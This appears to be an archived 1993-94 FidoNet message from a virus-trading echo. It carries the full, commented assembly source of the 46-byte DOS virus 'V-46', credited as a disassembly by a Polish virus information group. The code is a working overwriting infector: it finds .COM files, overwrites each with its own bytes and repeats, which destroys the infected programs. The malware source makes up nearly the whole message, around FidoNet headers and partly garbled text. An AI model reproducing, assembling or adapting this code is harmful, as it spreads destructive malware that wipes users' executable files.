;ฤ PVT.VIRII (2:465/65.4) ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ PVT.VIRII ฤ
; Msg  : 1 of 62
; From : MeteO                               2:5030/136      Tue 09 Nov 93 09:08
; To   : -  *.*  -                                           Fri 11 Nov 94 08:10
; Subj : TRV_46.ASM
;ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ
;.RealName: Max Ivanov
;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
;* Kicked-up by MeteO (2:5030/136)
;* Area : VIRUS (Int: ญไฎpฌ ๆจ๏ ฎ ขจpใแ ๅ)
;* From : Doug Bryce, 2:283/718 (06 Nov 94 16:02)
;* To   : Graham Allen
;* Subj : TRV_46.ASM
;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
;@RFC-Path:
;ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
;18.n283!not-for-mail
;@RFC-Return-Receipt-To: Doug.Bryce@f718.n283.z2.fidonet.org
;==================================================
; Virus V-46 (distributed by FIDO!!) on July 1991
;
; disassembled by Andrzej Kadlof July 24, 1991
;
; (C) Polish Section of Virus Information Bank
;==================================================

; virus entry point

segment code
org 100h
begin:        mov    ah,4Eh        ; Find First
        mov    cl,20h        ; archive
        mov    dx,0128h      ; asciiz file name '*.COM', 0
        int    21h

        mov    dx,009Eh      ; buffer
        mov    ax,3D01h      ; open file for write
        int    21h

        mov    bx,ax        ; file handle
        mov    dx,0100h      ; virus address
        mov    cl,2Eh        ; file length
        mov    ah,40h        ; write file
        int    21h

        mov    ah,3Eh        ; close file
        int    21h

        mov    ah,4Fh        ; find next
        int    21h

        mov ax,109h
        push ax
        retn

        int    20h           ; return to DOS

db '*.COM', 0
code ends
end begin

; That's all!

;-+-  GEcho 1.00
; + Origin: Stop creating them! Virusses aren't great! (2:283/718)
;=============================================================================
;
;Yoo-hooo-oo, -!
;
;
;    þ The MeยeO
;
;/dSYM[=VAL]   Define symbol SYM = 0, or = value VAL
;
;--- Aidstest Null: /Kill
; * Origin: ๙PVT.ViRII๚main๚board๚ / Virus Research labs. (2:5030/136)

